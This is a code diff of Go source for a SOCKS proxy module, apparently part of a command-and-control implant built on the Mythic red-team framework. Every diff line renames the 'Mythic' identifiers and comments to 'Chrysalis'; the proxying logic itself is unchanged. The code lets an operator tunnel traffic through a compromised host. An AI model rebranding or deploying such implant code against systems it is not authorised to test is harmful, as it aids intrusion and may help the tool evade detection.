@@ -99,7 +99,7 @@ func Run(task structs.Task) {
 	resp := structs.Response{}
 	if args.Action == "start" {
 		closeAllChannels()
-		go readFromMythic(profiles.FromMythicSocksChannel, profiles.ToMythicSocksChannel)
+		go readFromChrysalis(profiles.FromChrysalisSocksChannel, profiles.ToChrysalisSocksChannel)
 		resp.UserOutput = "Socks started"
 		resp.Completed = true
 		resp.TaskID = task.TaskID
@@ -141,12 +141,12 @@ func removeMutexMap(connection int32, conn net.Conn) {
 	}
 	//channelMap.Unlock()
 }
-func readFromMythic(fromMythicSocksChannel chan structs.SocksMsg, toMythicSocksChannel chan structs.SocksMsg) {
+func readFromChrysalis(fromChrysalisSocksChannel chan structs.SocksMsg, toChrysalisSocksChannel chan structs.SocksMsg) {
 	for {
 		select {
-		case curMsg := <-fromMythicSocksChannel:
+		case curMsg := <-fromChrysalisSocksChannel:
 			//now we have a message, process it
-			//fmt.Println("about to lock in mythic read")
+			//fmt.Println("about to lock in chrysalis read")
 			data, err := base64.StdEncoding.DecodeString(curMsg.Data)
 			if err != nil {
 				//fmt.Printf("Failed to decode message")
@@ -156,20 +156,20 @@ func readFromMythic(fromMythicSocksChannel chan structs.SocksMsg, toMythicSocksC
 			//channelMap.RLock()
 			thisChan, ok := channelMap.m[curMsg.ServerId]
 
-			//fmt.Println("just unlocked in mythic read")
+			//fmt.Println("just unlocked in chrysalis read")
 			if !ok {
 				//channelMap.RUnlock()
 				// we don't have this connection registered, spin off new channel
 				if curMsg.Exit {
-					//fmt.Printf("don't have channel %d, but mythic said exit, just continue loop\n", curMsg.ServerId)
-					//we don't have an open connection and mythic is telling us to close it, just break and continue
+					//fmt.Printf("don't have channel %d, but chrysalis said exit, just continue loop\n", curMsg.ServerId)
+					//we don't have an open connection and chrysalis is telling us to close it, just break and continue
 					continue
 				}
 				//fmt.Printf("about to add to mutex map\n")
 				addMutexMap(curMsg.ServerId)
 				//fmt.Printf("added to mutex map\n")
 				//fmt.Printf("opening new proxy connection\n")
-				go connectToProxy(fromMythicSocksChannel, curMsg.ServerId, toMythicSocksChannel, data)
+				go connectToProxy(fromChrysalisSocksChannel, curMsg.ServerId, toChrysalisSocksChannel, data)
 				//fmt.Printf("connected to proxy with new connection")
 			} else {
 				// we already have an opened connection, send data to this channel
@@ -187,7 +187,7 @@ func readFromMythic(fromMythicSocksChannel chan structs.SocksMsg, toMythicSocksC
 		}
 	}
 }
-func connectToProxy(fromMythicSocksChannel chan structs.SocksMsg, channelId int32, toMythicSocksChannel chan structs.SocksMsg, data []byte) {
+func connectToProxy(fromChrysalisSocksChannel chan structs.SocksMsg, channelId int32, toChrysalisSocksChannel chan structs.SocksMsg, data []byte) {
 	r := bytes.NewReader(data)
 	//fmt.Printf("got connect request: %v, %v\n", data, channelId)
 	header := []byte{0, 0, 0}
@@ -197,9 +197,9 @@ func connectToProxy(fromMythicSocksChannel chan structs.SocksMsg, channelId int3
 		msg.ServerId = channelId
 		msg.Data = base64.StdEncoding.EncodeToString(bytesToSend)
 		msg.Exit = true
-		toMythicSocksChannel <- msg
-		//fmt.Printf("Telling mythic locally to exit channel in connectToProxy %d, exit going back to mythic too\n", channelId)
-		fromMythicSocksChannel <- msg
+		toChrysalisSocksChannel <- msg
+		//fmt.Printf("Telling chrysalis locally to exit channel in connectToProxy %d, exit going back to chrysalis too\n", channelId)
+		fromChrysalisSocksChannel <- msg
 		//go removeMutexMap(channelMap, channelId, nil)
 		return
 	}
@@ -210,9 +210,9 @@ func connectToProxy(fromMythicSocksChannel chan structs.SocksMsg, channelId int3
 		msg.ServerId = channelId
 		msg.Data = ""
 		msg.Exit = true
-		toMythicSocksChannel <- msg
-		//fmt.Printf("Telling mythic locally to exit channel %d from bad headers, exit going back to mythic too\n", channelId)
-		fromMythicSocksChannel <- msg
+		toChrysalisSocksChannel <- msg
+		//fmt.Printf("Telling chrysalis locally to exit channel %d from bad headers, exit going back to chrysalis too\n", channelId)
+		fromChrysalisSocksChannel <- msg
 		//go removeMutexMap(channelMap, channelId, nil)
 		return
 	}
@@ -226,9 +226,9 @@ func connectToProxy(fromMythicSocksChannel chan structs.SocksMsg, channelId int3
 		msg.ServerId = channelId
 		msg.Data = base64.StdEncoding.EncodeToString(bytesToSend)
 		msg.Exit = true
-		toMythicSocksChannel <- msg
-		//fmt.Printf("Telling mythic locally to exit channel %d from bad address, exit going back to mythic too\n", channelId)
-		fromMythicSocksChannel <- msg
+		toChrysalisSocksChannel <- msg
+		//fmt.Printf("Telling chrysalis locally to exit channel %d from bad address, exit going back to chrysalis too\n", channelId)
+		fromChrysalisSocksChannel <- msg
 		//go removeMutexMap(channelMap, channelId, nil)
 		return
 	}
@@ -254,9 +254,9 @@ func connectToProxy(fromMythicSocksChannel chan structs.SocksMsg, channelId int3
 			msg.ServerId = channelId
 			msg.Data = base64.StdEncoding.EncodeToString(bytesToSend)
 			msg.Exit = true
-			toMythicSocksChannel <- msg
-			//fmt.Printf("Telling mythic locally to exit channel %d from unresolved fqdn, exit going back to mythic too\n", channelId)
-			fromMythicSocksChannel <- msg
+			toChrysalisSocksChannel <- msg
+			//fmt.Printf("Telling chrysalis locally to exit channel %d from unresolved fqdn, exit going back to chrysalis too\n", channelId)
+			fromChrysalisSocksChannel <- msg
 			//fmt.Printf("Failed to resolve destination '%v': %v\n", dest.FQDN, err)
 			//go removeMutexMap(channelMap, channelId, nil)
 			return
@@ -283,9 +283,9 @@ func connectToProxy(fromMythicSocksChannel chan structs.SocksMsg, channelId int3
 			msg.ServerId = channelId
 			msg.Data = base64.StdEncoding.EncodeToString(bytesToSend)
 			msg.Exit = true
-			toMythicSocksChannel <- msg
-			//fmt.Printf("Telling mythic locally to exit channel %d from bad command, exit going back to mythic too\n", channelId)
-			fromMythicSocksChannel <- msg
+			toChrysalisSocksChannel <- msg
+			//fmt.Printf("Telling chrysalis locally to exit channel %d from bad command, exit going back to chrysalis too\n", channelId)
+			fromChrysalisSocksChannel <- msg
 			//fmt.Printf("Connect to %v failed: %v, %v\n", request.DestAddr, errorMsg, data)
 			//go removeMutexMap(channelMap, channelId, nil)
 			return
@@ -299,10 +299,10 @@ func connectToProxy(fromMythicSocksChannel chan structs.SocksMsg, channelId int3
 		msg.Data = base64.StdEncoding.EncodeToString(bytesToSend)
 		msg.Exit = false
 		//fmt.Printf("channel (%d) Sending %v\n", channelId, msg.Data)
-		toMythicSocksChannel <- msg
+		toChrysalisSocksChannel <- msg
 		//fmt.Printf("spinning off writeToProxy and readFromProxy routines for (%d)\n", channelId)
-		go writeToProxy(fromMythicSocksChannel, target, channelId, toMythicSocksChannel)
-		go readFromProxy(fromMythicSocksChannel, target, toMythicSocksChannel, channelId)
+		go writeToProxy(fromChrysalisSocksChannel, target, channelId, toChrysalisSocksChannel)
+		go readFromProxy(fromChrysalisSocksChannel, target, toChrysalisSocksChannel, channelId)
 	default:
 		//fmt.Printf("In command switch, hit default case\n")
 		bytesToSend := SendReply(nil, CommandNotSupported, nil)
@@ -310,16 +310,16 @@ func connectToProxy(fromMythicSocksChannel chan structs.SocksMsg, channelId int3
 		msg.ServerId = channelId
 		msg.Data = base64.StdEncoding.EncodeToString(bytesToSend)
 		msg.Exit = true
-		toMythicSocksChannel <- msg
-		//fmt.Printf("Telling mythic locally to exit channel %d from default command case, exit going back to mythic too\n", channelId)
-		fromMythicSocksChannel <- msg
+		toChrysalisSocksChannel <- msg
+		//fmt.Printf("Telling chrysalis locally to exit channel %d from default command case, exit going back to chrysalis too\n", channelId)
+		fromChrysalisSocksChannel <- msg
 		//fmt.Printf("Unsupported command: %v, %v\n", request.Command, channelId)
 		//go removeMutexMap(channelMap, channelId, nil)
 		return
 	}
 	//fmt.Printf("Returning from creating new proxy connection\n")
 }
-func readFromProxy(fromMythicSocksChannel chan structs.SocksMsg, conn net.Conn, toMythicSocksChannel chan structs.SocksMsg, channelId int32) {
+func readFromProxy(fromChrysalisSocksChannel chan structs.SocksMsg, conn net.Conn, toChrysalisSocksChannel chan structs.SocksMsg, channelId int32) {
 	//numOfZeros := 0
 	for {
 		bufIn := make([]byte, 512000)
@@ -335,9 +335,9 @@ func readFromProxy(fromMythicSocksChannel chan structs.SocksMsg, conn net.Conn, 
 			msg.ServerId = channelId
 			msg.Data = "" //base64 of -1
 			msg.Exit = true
-			toMythicSocksChannel <- msg
-			//fmt.Printf("Telling mythic locally to exit channel %d from bad proxy read, exit going back to mythic too\n", channelId)
-			fromMythicSocksChannel <- msg
+			toChrysalisSocksChannel <- msg
+			//fmt.Printf("Telling chrysalis locally to exit channel %d from bad proxy read, exit going back to chrysalis too\n", channelId)
+			fromChrysalisSocksChannel <- msg
 			conn.Close()
 			//fmt.Printf("closing from bad proxy read: %v, %v\n", err.Error(), channelId)
 			//go removeMutexMap(channelMap, channelId, conn)
@@ -349,7 +349,7 @@ func readFromProxy(fromMythicSocksChannel chan structs.SocksMsg, conn net.Conn, 
 			msg.ServerId = channelId
 			msg.Data = base64.StdEncoding.EncodeToString(bufIn[:totalRead])
 			msg.Exit = false
-			toMythicSocksChannel <- msg
+			toChrysalisSocksChannel <- msg
 		}
 	}
 	//fmt.Printf("channel (%d) proxy connection for reading done\n", channelId)
@@ -357,12 +357,12 @@ func readFromProxy(fromMythicSocksChannel chan structs.SocksMsg, conn net.Conn, 
 	msg.ServerId = channelId
 	msg.Data = ""
 	msg.Exit = true
-	//fmt.Printf("Telling mythic locally to exit channel %d reading go routine exiting, exit going back to mythic too\n", channelId)
-	fromMythicSocksChannel <- msg
+	//fmt.Printf("Telling chrysalis locally to exit channel %d reading go routine exiting, exit going back to chrysalis too\n", channelId)
+	fromChrysalisSocksChannel <- msg
 	conn.Close()
 	//go removeMutexMap(channelMap, channelId, conn)
 }
-func writeToProxy(fromMythicSocksChannel chan structs.SocksMsg, conn net.Conn, channelId int32, toMythicSocksChannel chan structs.SocksMsg) {
+func writeToProxy(fromChrysalisSocksChannel chan structs.SocksMsg, conn net.Conn, channelId int32, toChrysalisSocksChannel chan structs.SocksMsg) {
 	channelMap.RLock()
 	myChan := channelMap.m[channelId]
 	channelMap.RUnlock()
@@ -371,11 +371,11 @@ func writeToProxy(fromMythicSocksChannel chan structs.SocksMsg, conn net.Conn, c
 		// Send a response back to person contacting us.
 		//fmt.Printf("writeToProxy wants to send %d bytes\n", len(bufOut.Data))
 		if bufOut.Exit {
-			// got a message from mythic that says to exit
-			//fmt.Printf("channel (%d) got exit message from Mythic\n", channelId)
+			// got a message from chrysalis that says to exit
+			//fmt.Printf("channel (%d) got exit message from Chrysalis\n", channelId)
 			w.Flush()
-			//fmt.Printf("Telling mythic locally to exit channel %d, exit going back to mythic too\n", channelId)
-			//fromMythicSocksChannel <- bufOut
+			//fmt.Printf("Telling chrysalis locally to exit channel %d, exit going back to chrysalis too\n", channelId)
+			//fromChrysalisSocksChannel <- bufOut
 			conn.Close()
 			//go removeMutexMap(channelMap, channelId, conn)
 			return
@@ -388,8 +388,8 @@ func writeToProxy(fromMythicSocksChannel chan structs.SocksMsg, conn net.Conn, c
 			msg.ServerId = channelId
 			msg.Data = ""
 			msg.Exit = true
-			//fmt.Printf("Telling mythic locally to exit channel %d, bad base64 data, exit going back to mythic too\n", channelId)
-			fromMythicSocksChannel <- msg
+			//fmt.Printf("Telling chrysalis locally to exit channel %d, bad base64 data, exit going back to chrysalis too\n", channelId)
+			fromChrysalisSocksChannel <- msg
 			conn.Close()
 			//go removeMutexMap(channelMap, channelId, conn)
 			return
@@ -401,9 +401,9 @@ func writeToProxy(fromMythicSocksChannel chan structs.SocksMsg, conn net.Conn, c
 			msg.ServerId = channelId
 			msg.Data = ""
 			msg.Exit = true
-			toMythicSocksChannel <- msg
-			//fmt.Printf("Telling mythic locally to exit channel %d bad write to proxy, exit going back to mythic too\n", channelId)
-			fromMythicSocksChannel <- msg
+			toChrysalisSocksChannel <- msg
+			//fmt.Printf("Telling chrysalis locally to exit channel %d bad write to proxy, exit going back to chrysalis too\n", channelId)
+			fromChrysalisSocksChannel <- msg
 			conn.Close()
 			//fmt.Printf("channel (%d) closing from bad proxy write\n", channelId)
 			//go removeMutexMap(channelMap, channelId, conn)
@@ -418,8 +418,8 @@ func writeToProxy(fromMythicSocksChannel chan structs.SocksMsg, conn net.Conn, c
 	msg.ServerId = channelId
 	msg.Data = ""
 	msg.Exit = true
-	//fmt.Printf("Telling mythic locally to exit channel %d proxy writing go routine exiting, exit going back to mythic too\n", channelId)
-	fromMythicSocksChannel <- msg
+	//fmt.Printf("Telling chrysalis locally to exit channel %d proxy writing go routine exiting, exit going back to chrysalis too\n", channelId)
+	fromChrysalisSocksChannel <- msg
 	conn.Close()
 	//go removeMutexMap(channelMap, channelId, conn)
 	return
